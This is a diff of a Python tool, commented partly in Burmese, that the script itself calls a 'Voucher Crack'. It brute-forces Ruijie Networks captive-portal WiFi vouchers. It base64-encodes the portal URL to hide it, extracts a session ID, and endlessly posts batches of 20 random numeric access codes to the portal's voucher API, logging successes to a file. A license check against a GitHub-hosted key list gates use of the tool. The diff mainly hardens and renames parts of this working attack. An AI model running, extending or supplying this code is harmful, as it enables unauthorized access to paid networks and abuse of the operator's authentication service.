@@ -14,11 +14,7 @@ import requests
 from datetime import datetime
 
 # --- UI COLORS ---
-w = "\033[1;00m"
-g = "\033[1;32m"
-y = "\033[1;33m"
-r = "\033[1;31m"
-b = "\033[1;34m"
+w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"
 
 # --- UI & LOGO ---
 def Logo():
@@ -40,11 +36,10 @@ def Logo():
 
 # --- SECURITY SYSTEM (FIXED ID & ANTI-CACHE) ---
 def get_hwid():
-    """ဖုန်းရဲ့ Fixed ID ကို ထုတ်ယူခြင်း (MAC Address မသုံးပါ)"""
+    """ဖုန်းရဲ့ Fixed ID ကို ထုတ်ယူခြင်း"""
     try:
         user = os.environ.get('USER', 'default')
         cpu = str(os.cpu_count())
-        # Environment data ကိုသုံးပြီး Unique Hash ထုတ်ခြင်း
         raw_id = f"{user}-{cpu}-MOEYU-STABLE"
         fixed_id = hashlib.sha1(raw_id.encode()).hexdigest()[:12].upper()
         return f"MY-{fixed_id}"
@@ -54,14 +49,13 @@ def get_hwid():
 def check_license():
     Logo()
     my_id = get_hwid()
-    # သင်၏ GitHub Raw URL
     key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
     
     print(f"{b}[*] Your ID: {y}{my_id}{w}")
     print(f"{b}[*] Checking license status...{w}")
     
     try:
-        # GitHub Cache မမိစေရန် Headers နှင့် Random Params သုံးခြင်း
+        # Cache မမိစေရန် Headers သုံးခြင်း
         headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
         response = requests.get(f"{key_url}?nocache={random.randint(1000, 9999)}", headers=headers, timeout=10)
         
@@ -76,7 +70,6 @@ def check_license():
         for line in lines:
             if "|" in line:
                 db_id, exp_date = line.split("|")
-                # ID ကို ရှေ့နောက် Space ဖယ်ပြီး တိုက်စစ်ခြင်း
                 if db_id.strip() == my_id:
                     is_verified = True
                     expiry = datetime.strptime(exp_date.strip(), "%Y-%m-%d")
@@ -91,8 +84,6 @@ def check_license():
         if not is_verified:
             print(f"{r}[!] ID Not Registered in Server!{w}")
             print(f"{y}[>] Send this ID to Admin: {w}{my_id}")
-            # Debug: Server ထဲမှာ လက်ရှိရှိနေတဲ့ စာသားကိုပါ ပြပေးခြင်း
-            print(f"\n{b}[Server Data Debug]:\n{w}{server_data}")
             sys.exit()
             
     except Exception as e:
@@ -102,17 +93,27 @@ def check_license():
 # --- CORE LOGIC (Voucher Crack) ---
 async def crack(l, s):
     Logo()
-    # Ruijie Session URL (Base64)
+    # Ruijie URL Decode
     url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
     
     async with aiohttp.ClientSession() as session:
         try:
             async with session.get(url) as r_url:
-                sid = re.search(r"sessionId=([a-zA-Z0-9]+)", str(r_url.url)).group(1)
+                # sessionId ရှာမတွေ့ပါက Error မတက်အောင် Safe-match လုပ်ခြင်း
+                url_str = str(r_url.url)
+                match = re.search(r"sessionId=([a-zA-Z0-9]+)", url_str)
+                
+                if not match:
+                    print(f"{r}[!] Error: Session ID not found. Your WiFi portal might be expired.{w}")
+                    print(f"{y}[*] Please log in to your WiFi Portal again.{w}")
+                    return
+                
+                sid = match.group(1)
             
+            print(f"{g}[*] Session Established: {sid}{w}")
             while True:
                 tasks = []
-                for _ in range(20): # Batch speed
+                for _ in range(20):
                     v = "".join(random.choice(string.digits) for _ in range(l))
                     tasks.append(session.post("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US", 
                                              json={"accessCode": v, "sessionId": sid, "apiVersion": 1}))
@@ -121,15 +122,14 @@ async def crack(l, s):
                 for res in responses:
                     res_text = await res.text()
                     if 'logonUrl' in res_text:
-                        # Extract success code if possible or use the current v
-                        print(f"\n{g}[SUCCESS] Code Found!{w}")
-                        open("success.txt", "a").write(f"Success Code Found at {time.ctime()}\n")
+                        print(f"\n{g}[SUCCESS] Valid Code Detected!{w}")
+                        with open("success.txt", "a") as f: f.write(f"Voucher found at {time.ctime()}\n")
                     else:
-                        print(f"{w}[*] Testing Status: {y}Running...{w}", end="\r")
+                        print(f"{w}[*] Cracking: {y}Running...{w}", end="\r")
         except Exception as e:
-            print(f"{r}Error: {e}{w}")
+            print(f"\n{r}[!] Connection Lost: {e}{w}")
 
-# --- MAIN RUNNER ---
+# --- MAIN ---
 def main():
     check_license()
     parser = argparse.ArgumentParser()
@@ -141,10 +141,10 @@ def main():
     if args.option == "code":
         asyncio.run(crack(args.length, args.speed))
     else:
-        print(f"{r}[!] Option not recognized.{w}")
+        print(f"{r}[!] Unknown Option.{w}")
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{r}[!] Process Stopped.{w}")
+        print(f"\n{r}[!] Process Exited.{w}")
